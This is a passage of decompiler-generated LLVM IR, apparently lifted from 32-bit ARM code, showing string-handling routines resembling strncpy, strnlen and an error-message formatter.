  %v0_ee58142 = phi i32 [ %v3_ee28, %dec_label_pc_ee44 ], [ 0, %.thread59 ]
  %v1_ee5854 = phi i32 [ %v3_ee24, %dec_label_pc_ee44 ], [ 0, %.thread59 ]
  %v0_ee2447 = phi i32 [ %v1_ee44, %dec_label_pc_ee44 ], [ %v0_ed44, %.thread59 ]
  %v0_ee4c.pr = phi i32 [ %v1_ee50, %dec_label_pc_ee44 ], [ %v0_ed3c, %.thread59 ]
  br label %dec_label_pc_ee4c

dec_label_pc_ee4c:                                ; preds = %dec_label_pc_ee4cthread-pre-split, %dec_label_pc_ee1c
  %v0_ee58 = phi i32 [ %v0_ee58142, %dec_label_pc_ee4cthread-pre-split ], [ %v4_edf0, %dec_label_pc_ee1c ]
  %v1_ee58 = phi i32 [ %v1_ee5854, %dec_label_pc_ee4cthread-pre-split ], [ %v4_edec, %dec_label_pc_ee1c ]
  %v0_ee44 = phi i32 [ %v0_ee2447, %dec_label_pc_ee4cthread-pre-split ], [ %v1_eda8, %dec_label_pc_ee1c ]
  %v0_ee50 = phi i32 [ %v0_ee4c.pr, %dec_label_pc_ee4cthread-pre-split ], [ %v1_ee1c, %dec_label_pc_ee1c ]
  %v2_ee4c = icmp eq i32 %v0_ee50, 0
  %v1_ee50 = add i32 %v0_ee50, -1
  store i32 %v1_ee50, i32* %r2.global-to-local, align 4
  br i1 %v2_ee4c, label %dec_label_pc_ee58, label %dec_label_pc_ee24

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee4c
  %v2_ee58 = sub nsw i32 %v1_ee58, %v0_ee58
  store i32 %v2_ee58, i32* %r0.global-to-local, align 4
  ret i32 %v2_ee58

; uselistorder directives
  uselistorder i32 %v1_ee50, { 1, 0 }
  uselistorder i32 %v0_ee44, { 1, 0 }
  uselistorder i32 %v3_ee28, { 0, 3, 2, 1 }
  uselistorder i32 %v3_ee24, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ee1c, { 1, 0 }
  uselistorder i32 %v1_edf8, { 1, 0 }
  uselistorder i32 %v4_edf0, { 1, 3, 2, 0 }
  uselistorder i32 %v4_edec, { 1, 2, 3, 0 }
  uselistorder i32 %v2_edd4, { 2, 0, 1 }
  uselistorder i32 %v2_edac, { 2, 0, 1 }
  uselistorder i32 %v1_eda8, { 0, 2, 1 }
  uselistorder i32 %v3_ed78, { 2, 1, 0 }
  uselistorder i32 %v3_ed74, { 1, 2, 0 }
  uselistorder i32 %v0_ed3c, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 8, 10, 9, 5, 7, 11, 0, 1 }
  uselistorder label %dec_label_pc_ee4cthread-pre-split, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_ed68, { 5, 2, 0, 3, 1, 4 }
}

define i32 @function_ee60(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ee60:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_ee60 = icmp eq i32 %arg2, 3
  store i1 %v7_ee60, i1* %cpsr_z.global-to-local, align 1
  %v1_ee68 = add i32 %arg1, -1
  store i32 %v1_ee68, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_eee4, label %dec_label_pc_ee70

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee60
  %v3_ee70 = udiv i32 %arg2, 4
  store i32 %v3_ee70, i32* @lr, align 4
  %v0_ee74.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_ee74

dec_label_pc_ee74:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_ee70
  %v2_ee7c = phi i32 [ %v6_eeb4, %dec_label_pc_eec0 ], [ %v1_ee68, %dec_label_pc_ee70 ]
  %v0_ee74 = phi i32 [ %v1_eec4, %dec_label_pc_eec0 ], [ %v0_ee74.pre, %dec_label_pc_ee70 ]
  %v1_ee74 = inttoptr i32 %v0_ee74 to i8*
  %v2_ee74 = load i8, i8* %v1_ee74, align 1
  %v3_ee74 = zext i8 %v2_ee74 to i32
  store i32 %v3_ee74, i32* %r3.global-to-local, align 4
  %v2_ee78 = icmp eq i8 %v2_ee74, 0
  store i1 %v2_ee78, i1* %cpsr_z.global-to-local, align 1
  %v3_ee7c = add i32 %v2_ee7c, 1
  %v4_ee7c = inttoptr i32 %v3_ee7c to i8*
  store i8 %v2_ee74, i8* %v4_ee7c, align 1
  %v5_ee7c = load i32, i32* %ip.global-to-local, align 4
  %v6_ee7c = add i32 %v5_ee7c, 1
  store i32 %v6_ee7c, i32* %ip.global-to-local, align 4
  %v0_ee80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee80, label %dec_label_pc_eed0, label %dec_label_pc_ee84

dec_label_pc_ee84:                                ; preds = %dec_label_pc_ee74
  %v0_ee84 = load i32, i32* @r1, align 4
  %v1_ee84 = add i32 %v0_ee84, 1
  %v2_ee84 = inttoptr i32 %v1_ee84 to i8*
  %v3_ee84 = load i8, i8* %v2_ee84, align 1
  %v4_ee84 = zext i8 %v3_ee84 to i32
  store i32 %v4_ee84, i32* %r3.global-to-local, align 4
  %v2_ee88 = icmp eq i8 %v3_ee84, 0
  store i1 %v2_ee88, i1* %cpsr_z.global-to-local, align 1
  %v3_ee8c = add i32 %v5_ee7c, 2
  %v4_ee8c = inttoptr i32 %v3_ee8c to i8*
  store i8 %v3_ee84, i8* %v4_ee8c, align 1
  %v5_ee8c = load i32, i32* %ip.global-to-local, align 4
  %v6_ee8c = add i32 %v5_ee8c, 1
  store i32 %v6_ee8c, i32* %ip.global-to-local, align 4
  %v0_ee90 = load i32, i32* @r1, align 4
  %v1_ee90 = add i32 %v0_ee90, 1
  store i32 %v1_ee90, i32* %r1.global-to-local, align 4
  %v0_ee94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee94, label %dec_label_pc_eed0, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee84
  %v1_ee98 = add i32 %v0_ee90, 2
  %v2_ee98 = inttoptr i32 %v1_ee98 to i8*
  %v3_ee98 = load i8, i8* %v2_ee98, align 1
  %v4_ee98 = zext i8 %v3_ee98 to i32
  store i32 %v4_ee98, i32* %r3.global-to-local, align 4
  %v2_ee9c = icmp eq i8 %v3_ee98, 0
  store i1 %v2_ee9c, i1* %cpsr_z.global-to-local, align 1
  %v3_eea0 = add i32 %v5_ee8c, 2
  %v4_eea0 = inttoptr i32 %v3_eea0 to i8*
  store i8 %v3_ee98, i8* %v4_eea0, align 1
  %v5_eea0 = load i32, i32* %ip.global-to-local, align 4
  %v6_eea0 = add i32 %v5_eea0, 1
  store i32 %v6_eea0, i32* %ip.global-to-local, align 4
  %v0_eea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eea4 = add i32 %v0_eea4, 1
  store i32 %v1_eea4, i32* %r1.global-to-local, align 4
  %v0_eea8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eea8, label %dec_label_pc_eed0, label %dec_label_pc_eeac

dec_label_pc_eeac:                                ; preds = %dec_label_pc_ee98
  %v1_eeac = add i32 %v0_eea4, 2
  %v2_eeac = inttoptr i32 %v1_eeac to i8*
  %v3_eeac = load i8, i8* %v2_eeac, align 1
  %v4_eeac = zext i8 %v3_eeac to i32
  store i32 %v4_eeac, i32* %r3.global-to-local, align 4
  %v2_eeb0 = icmp eq i8 %v3_eeac, 0
  store i1 %v2_eeb0, i1* %cpsr_z.global-to-local, align 1
  %v3_eeb4 = add i32 %v5_eea0, 2
  %v4_eeb4 = inttoptr i32 %v3_eeb4 to i8*
  store i8 %v3_eeac, i8* %v4_eeb4, align 1
  %v5_eeb4 = load i32, i32* %ip.global-to-local, align 4
  %v6_eeb4 = add i32 %v5_eeb4, 1
  store i32 %v6_eeb4, i32* %ip.global-to-local, align 4
  %v0_eeb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eeb8 = add i32 %v0_eeb8, 1
  store i32 %v1_eeb8, i32* %r1.global-to-local, align 4
  %v0_eebc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eebc, label %dec_label_pc_eed0, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeac
  %v0_eec0 = load i32, i32* @lr, align 4
  %v1_eec0 = add i32 %v0_eec0, -1
  store i32 %v1_eec0, i32* @lr, align 4
  %v7_eec0 = icmp eq i32 %v0_eec0, 1
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  %v1_eec4 = add i32 %v0_eeb8, 2
  store i32 %v1_eec4, i32* @r1, align 4
  br i1 %v7_eec0, label %dec_label_pc_eee4, label %dec_label_pc_ee74

dec_label_pc_eed0:                                ; preds = %dec_label_pc_eeac, %dec_label_pc_ee98, %dec_label_pc_ee84, %dec_label_pc_ee74
  %v1_eed0 = phi i32 [ %v6_eeb4, %dec_label_pc_eeac ], [ %v6_eea0, %dec_label_pc_ee98 ], [ %v6_ee8c, %dec_label_pc_ee84 ], [ %v6_ee7c, %dec_label_pc_ee74 ]
  %v2_eed01 = sub i32 %arg1, %v1_eed0
  %v2_eed4 = add i32 %v2_eed01, %arg2
  store i32 %v2_eed4, i32* %r3.global-to-local, align 4
  %v1_eed8 = add i32 %v2_eed4, -1
  store i32 %v1_eed8, i32* %r2.global-to-local, align 4
  %v7_eed8 = icmp eq i32 %v2_eed4, 1
  store i1 %v7_eed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed8, label %bb, label %dec_label_pc_ef04

bb:                                               ; preds = %dec_label_pc_eed0
  ret i32 %arg1

dec_label_pc_eee4:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_ee60
  %v2_eef46 = phi i32 [ %v1_ee68, %dec_label_pc_ee60 ], [ %v6_eeb4, %dec_label_pc_eec0 ]
  %v1_eee4 = urem i32 %arg2, 4
  store i32 %v1_eee4, i32* %r2.global-to-local, align 4
  %v2_eee4 = icmp eq i32 %v1_eee4, 0
  store i1 %v2_eee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eee4, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_eee4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_eee4, %._crit_edge
  %v2_eef4 = phi i32 [ %v6_eef4, %._crit_edge ], [ %v2_eef46, %dec_label_pc_eee4 ]
  %v0_eef0 = phi i32 [ %v0_eef0.pre, %._crit_edge ], [ %v1_eee4, %dec_label_pc_eee4 ]
  %v0_eeec = load i32, i32* @r1, align 4
  %v1_eeec = inttoptr i32 %v0_eeec to i8*
  %v2_eeec = load i8, i8* %v1_eeec, align 1
  %v3_eeec = zext i8 %v2_eeec to i32
  store i32 %v3_eeec, i32* %r3.global-to-local, align 4
  %v5_eeec = add i32 %v0_eeec, 1
  store i32 %v5_eeec, i32* @r1, align 4
  %v1_eef0 = add i32 %v0_eef0, -1
  store i32 %v1_eef0, i32* %r2.global-to-local, align 4
  %v7_eef0 = icmp eq i32 %v0_eef0, 1
  store i1 %v7_eef0, i1* %cpsr_z.global-to-local, align 1
  %v3_eef4 = add i32 %v2_eef4, 1
  %v4_eef4 = inttoptr i32 %v3_eef4 to i8*
  store i8 %v2_eeec, i8* %v4_eef4, align 1
  %v5_eef4 = load i32, i32* %ip.global-to-local, align 4
  %v6_eef4 = add i32 %v5_eef4, 1
  store i32 %v6_eef4, i32* %ip.global-to-local, align 4
  %v0_eef8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eef8, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_eefc = load i32, i32* %r3.global-to-local, align 4
  %v2_eefc = icmp eq i32 %v0_eefc, 0
  store i1 %v2_eefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eefc, label %dec_label_pc_ef04, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_eef0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_ef04:                                ; preds = %dec_label_pc_eed0, %bb13, %dec_label_pc_ef04
  %v2_ef0c = phi i32 [ %v6_ef0c, %dec_label_pc_ef04 ], [ %v1_eed0, %dec_label_pc_eed0 ], [ %v6_eef4, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ef08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ef08 = add i32 %v0_ef08, -1
  store i32 %v1_ef08, i32* %r2.global-to-local, align 4
  %v7_ef08 = icmp eq i32 %v0_ef08, 1
  store i1 %v7_ef08, i1* %cpsr_z.global-to-local, align 1
  %v3_ef0c = add i32 %v2_ef0c, 1
  %v4_ef0c = inttoptr i32 %v3_ef0c to i8*
  store i8 0, i8* %v4_ef0c, align 1
  %v5_ef0c = load i32, i32* %ip.global-to-local, align 4
  %v6_ef0c = add i32 %v5_ef0c, 1
  store i32 %v6_ef0c, i32* %ip.global-to-local, align 4
  %v0_ef10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ef10, label %dec_label_pc_ef14, label %dec_label_pc_ef04

dec_label_pc_ef14:                                ; preds = %dec_label_pc_ef04
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_ef0c, { 1, 0 }
  uselistorder i32 %v0_ef08, { 1, 0 }
  uselistorder i32 %v6_eef4, { 0, 2, 1 }
  uselistorder i32 %v1_eee4, { 2, 1, 0 }
  uselistorder i32 %v2_eed4, { 2, 1, 0 }
  uselistorder i32 %v1_eec4, { 1, 0 }
  uselistorder i32 %v0_eec0, { 1, 0 }
  uselistorder i32 %v6_eeb4, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 2, 5, 4, 0, 3 }
  uselistorder label %dec_label_pc_ef04, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_ef18(i8* %arg1) local_unnamed_addr {
dec_label_pc_ef18:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_ef18 = load i32, i32* @r1, align 4
  %v2_ef18 = icmp eq i32 %v0_ef18, 0
  br i1 %v2_ef18, label %bb, label %dec_label_pc_ef48

bb:                                               ; preds = %dec_label_pc_ef18
  ret i32 0

dec_label_pc_ef30:                                ; preds = %dec_label_pc_ef58
  %v3_ef30 = icmp uge i32 %v5_efe4, %v1_ef30
  %v9_ef30 = icmp eq i32 %v5_efe4, %v1_ef30
  %v2_ef34 = xor i1 %v3_ef30, true
  %v3_ef34 = or i1 %v9_ef30, %v2_ef34
  br i1 %v3_ef34, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_ef30
  %v6_ef34 = sub i32 %v5_efe4, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_ef30, %bb19
  %v5_ef38 = phi i32 [ %v1_ef30, %dec_label_pc_ef30 ], [ %v6_ef34, %bb19 ]
  %v2_ef38 = xor i1 %v9_ef30, true
  %v3_ef38 = and i1 %v3_ef30, %v2_ef38
  br i1 %v3_ef38, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_ef38 = sub i32 %v5_ef38, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_ef3c = phi i32 [ %v5_ef38, %bb20 ], [ %v6_ef38, %bb21 ]
  ret i32 %v8_ef3c

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef8c
  br label %dec_label_pc_efe0

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef18
  %v2_ef48 = add i32 %tmp, %v0_ef18
  %v3_ef48 = icmp ult i32 %v2_ef48, %tmp
  br i1 %v3_ef48, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_ef48
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_ef48, %bb23
  %v5_efe4 = phi i32 [ %v2_ef48, %dec_label_pc_ef48 ], [ -1, %bb23 ]
  %v1_ef682 = urem i32 %tmp, 4
  %v2_ef683 = icmp eq i32 %v1_ef682, 0
  br i1 %v2_ef683, label %dec_label_pc_ef70, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %bb24, %dec_label_pc_ef64
  %v1_ef30 = phi i32 [ %v1_ef64, %dec_label_pc_ef64 ], [ %tmp, %bb24 ]
  %v1_ef58 = inttoptr i32 %v1_ef30 to i8*
  %v2_ef58 = load i8, i8* %v1_ef58, align 1
  %v2_ef5c = icmp eq i8 %v2_ef58, 0
  br i1 %v2_ef5c, label %dec_label_pc_ef30, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef58
  %v1_ef64 = add i32 %v1_ef30, 1
  %v1_ef68 = urem i32 %v1_ef64, 4
  %v2_ef68 = icmp eq i32 %v1_ef68, 0
  br i1 %v2_ef68, label %dec_label_pc_ef70, label %dec_label_pc_ef58

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef64, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_ef64, %dec_label_pc_ef64 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_efd032 = icmp ult i32 %storemerge.lcssa, %v5_efe4
  br i1 %v3_efd032, label %dec_label_pc_ef78, label %dec_label_pc_efe0

dec_label_pc_ef78:                                ; preds = %dec_label_pc_efcc, %dec_label_pc_ef70
  %v0_ef4039 = phi i32 [ %v4_ef78, %dec_label_pc_efcc ], [ %storemerge.lcssa, %dec_label_pc_ef70 ]
  %v1_ef78 = inttoptr i32 %v0_ef4039 to i32*
  %v2_ef78 = load i32, i32* %v1_ef78, align 4
  %v4_ef78 = add i32 %v0_ef4039, 4
  store i32 %v4_ef78, i32* @lr, align 4
  %v2_ef7c = add i32 %v2_ef78, -16843009
  %v2_ef80 = and i32 %v2_ef7c, -2139062144
  %v2_ef84 = icmp eq i32 %v2_ef80, 0
  br i1 %v2_ef84, label %dec_label_pc_efcc, label %dec_label_pc_ef8c

dec_label_pc_ef8c:                                ; preds = %dec_label_pc_ef78
  %v2_ef8c = inttoptr i32 %v0_ef4039 to i8*
  %v3_ef8c = load i8, i8* %v2_ef8c, align 1
  %v2_ef94 = icmp eq i8 %v3_ef8c, 0
  %v1_ef98 = add i32 %v0_ef4039, 1
  br i1 %v2_ef94, label %dec_label_pc_ef40, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef8c
  %v2_efa0 = inttoptr i32 %v1_ef98 to i8*
  %v3_efa0 = load i8, i8* %v2_efa0, align 1
  %v2_efa4 = icmp eq i8 %v3_efa0, 0
  br i1 %v2_efa4, label %dec_label_pc_efe0, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_efa0
  %v1_efac = add i32 %v0_ef4039, 2
  %v2_efac = inttoptr i32 %v1_efac to i8*
  %v3_efac = load i8, i8* %v2_efac, align 1
  %v2_efb0 = icmp eq i8 %v3_efac, 0
  br i1 %v2_efb0, label %dec_label_pc_efe0, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_efac
  %v1_efbc = add i32 %v0_ef4039, 3
  %v2_efbc = inttoptr i32 %v1_efbc to i8*
  %v3_efbc = load i8, i8* %v2_efbc, align 1
  %v2_efc0 = icmp eq i8 %v3_efbc, 0
  br i1 %v2_efc0, label %dec_label_pc_efe0, label %dec_label_pc_efcc

dec_label_pc_efcc:                                ; preds = %dec_label_pc_efbc, %dec_label_pc_ef78
  %v3_efd0 = icmp ult i32 %v4_ef78, %v5_efe4
  br i1 %v3_efd0, label %dec_label_pc_ef78, label %dec_label_pc_efe0

dec_label_pc_efe0:                                ; preds = %dec_label_pc_efcc, %dec_label_pc_ef70, %dec_label_pc_efa0, %dec_label_pc_efac, %dec_label_pc_efbc, %dec_label_pc_ef40
  %v1_efe0 = phi i32 [ %v0_ef4039, %dec_label_pc_ef40 ], [ %storemerge.lcssa, %dec_label_pc_ef70 ], [ %v1_ef98, %dec_label_pc_efa0 ], [ %v1_efac, %dec_label_pc_efac ], [ %v1_efbc, %dec_label_pc_efbc ], [ %v5_efe4, %dec_label_pc_efcc ]
  %v3_efe0 = icmp uge i32 %v5_efe4, %v1_efe0
  %v9_efe0 = icmp eq i32 %v5_efe4, %v1_efe0
  %v2_efe4 = xor i1 %v3_efe0, true
  %v3_efe4 = or i1 %v9_efe0, %v2_efe4
  br i1 %v3_efe4, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_efe0
  %v6_efe4 = sub i32 %v5_efe4, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_efe0, %bb25
  %v5_efe8 = phi i32 [ %v1_efe0, %dec_label_pc_efe0 ], [ %v6_efe4, %bb25 ]
  %v2_efe8 = xor i1 %v9_efe0, true
  %v3_efe8 = and i1 %v3_efe0, %v2_efe8
  br i1 %v3_efe8, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_efe8 = sub i32 %v5_efe8, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_efec = phi i32 [ %v5_efe8, %bb26 ], [ %v6_efe8, %bb27 ]
  ret i32 %v8_efec

; uselistorder directives
  uselistorder i1 %v3_efe0, { 1, 0 }
  uselistorder i32 %v4_ef78, { 1, 2, 0 }
  uselistorder i32 %v0_ef4039, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_ef64, { 1, 0, 2 }
  uselistorder i32 %v1_ef30, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_efe4, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_ef30, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_efe0, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_ef58, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_eff8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_eff8:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f000 = call i32 @function_f00c()
  %v0_f004 = load i32, i32* @r4, align 4
  ret i32 %v0_f004
}

define i32 @function_f00c() local_unnamed_addr {
dec_label_pc_f00c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_f00c = load i32, i32* @r4, align 4
  %v0_f010 = load i32, i32* @r0, align 4
  %v0_f01c = load i32, i32* @r1, align 4
  store i32 %v0_f01c, i32* @r8, align 4
  %v0_f020 = load i32, i32* @r2, align 4
  store i32 %v0_f020, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_f010, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_f058

thread-pre-split.preheader:                       ; preds = %dec_label_pc_f00c
  store i32 ptrtoint ([8 x i8]* @global_var_15dec.400 to i32), i32* @r5, align 4
  %v2_f0403446 = icmp eq i32 %v0_f010, 0
  br i1 %v2_f0403446, label %bb26, label %dec_label_pc_f034.lr.ph

dec_label_pc_f034:                                ; preds = %dec_label_pc_f034.lr.ph, %bb
  %v2_f04c41 = phi i1 [ %v2_f04c3849, %dec_label_pc_f034.lr.ph ], [ %v2_f04c, %bb ]
  %v1_f05040 = phi i32 [ %v0_f040.pr48, %dec_label_pc_f034.lr.ph ], [ %v2_f03c, %bb ]
  %v0_f03839 = phi i32 [ %v0_f044547, %dec_label_pc_f034.lr.ph ], [ %v1_f038, %bb ]
  %v1_f038 = add i32 %v0_f03839, 1
  store i32 %v1_f038, i32* @r5, align 4
  br i1 %v2_f04c41, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_f034
  %v2_f03c = add i32 %v1_f05040, -1
  %v2_f040 = icmp eq i32 %v2_f03c, 0
  %v1_f044 = inttoptr i32 %v1_f038 to i8*
  %v2_f044 = load i8, i8* %v1_f044, align 1
  %v2_f04c = icmp eq i8 %v2_f044, 0
  br i1 %v2_f040, label %dec_label_pc_f04c, label %dec_label_pc_f034

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_f034
  %v1_f04435 = inttoptr i32 %v1_f038 to i8*
  %v2_f04436 = load i8, i8* %v1_f04435, align 1
  %v2_f04c38 = icmp eq i8 %v2_f04436, 0
  br label %dec_label_pc_f034.lr.ph

dec_label_pc_f034.lr.ph:                          ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_f04c3849 = phi i1 [ %v2_f04c38, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_f040.pr48 = phi i32 [ %v1_f05040, %thread-pre-split.loopexit ], [ %v0_f010, %thread-pre-split.preheader ]
  %v0_f044547 = phi i32 [ %v1_f038, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_15dec.400 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_f034

dec_label_pc_f04c:                                ; preds = %bb
  br i1 %v2_f04c, label %dec_label_pc_f058, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_f04c
  %v0_f038.lcssa55 = phi i32 [ %v1_f038, %dec_label_pc_f04c ], [ ptrtoint ([8 x i8]* @global_var_15dec.400 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f058:                                ; preds = %dec_label_pc_f04c, %dec_label_pc_f00c
  %v3_f05c = ashr i32 %v0_f010, 31
  %v5_f070 = bitcast i32* %stack_var_-25 to i8*
  %v6_f070 = call i32 @function_11510(i8* %v5_f070, i32 %v0_f010, i32 %v3_f05c, i32 -10, i32 0)
  %v1_f074 = add i32 %v6_f070, -14
  store i32 %v1_f074, i32* @r5, align 4
  store i32 %v1_f074, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_15ddc.402 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_f084 = call i32 @function_ec10()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_f08c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %bb26, %dec_label_pc_f058
  %v0_f08c = phi i32 [ %v0_f038.lcssa55, %bb26 ], [ %v0_f08c.pre, %dec_label_pc_f058 ]
  store i32 %v0_f08c, i32* @r0, align 4
  %v0_f090 = call i32 @function_ecc0()
  %v0_f094 = load i32, i32* @r8, align 4
  %v2_f094 = icmp eq i32 %v0_f094, 0
  %v1_f098 = add i32 %v0_f090, 1
  store i32 %v1_f098, i32* @r4, align 4
  br i1 %v2_f094, label %bb27, label %dec_label_pc_f08c._crit_edge

dec_label_pc_f08c._crit_edge:                     ; preds = %dec_label_pc_f08c
  %v1_f0a0.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_f08c
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_f08c._crit_edge, %bb27
  %v4_f0a4 = phi i32 [ %v1_f0a0.pre, %dec_label_pc_f08c._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_f098, %v4_f0a4
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_f0a4, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_f0b414 = phi i32 [ %v4_f0a4, %bb29 ], [ %v1_f098, %bb28 ]
  %v2_f0ac = icmp eq i32 %v0_f0b414, 0
  br i1 %v2_f0ac, label %dec_label_pc_f0d0, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %.thread16
  store i32 %v0_f0b414, i32* @r2, align 4
  %v0_f0b8 = load i32, i32* @r5, align 4
  store i32 %v0_f0b8, i32* @r1, align 4
  store i32 %v0_f094, i32* @r0, align 4
  %v0_f0c0 = call i32 @function_ec10()
  %v0_f0c4 = load i32, i32* @r8, align 4
  %v1_f0c4 = load i32, i32* @r4, align 4
  %v2_f0c4 = add i32 %v1_f0c4, %v0_f0c4
  %v3_f0cc = add i32 %v2_f0c4, -1
  %v4_f0cc = inttoptr i32 %v3_f0cc to i8*
  store i8 0, i8* %v4_f0cc, align 1
  br label %dec_label_pc_f0d0

dec_label_pc_f0d0:                                ; preds = %.thread16, %dec_label_pc_f0b4
  %v0_f0d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_f0d0 = icmp eq i32 %v0_f0d0, 0
  br i1 %v2_f0d0, label %dec_label_pc_f0e0, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_f0d0
  %v0_f0d8 = call i32 @function_cc08()
  %v0_f0dc = load i32, i32* %r7.global-to-local, align 4
  %v2_f0dc = inttoptr i32 %v0_f0d8 to i32*
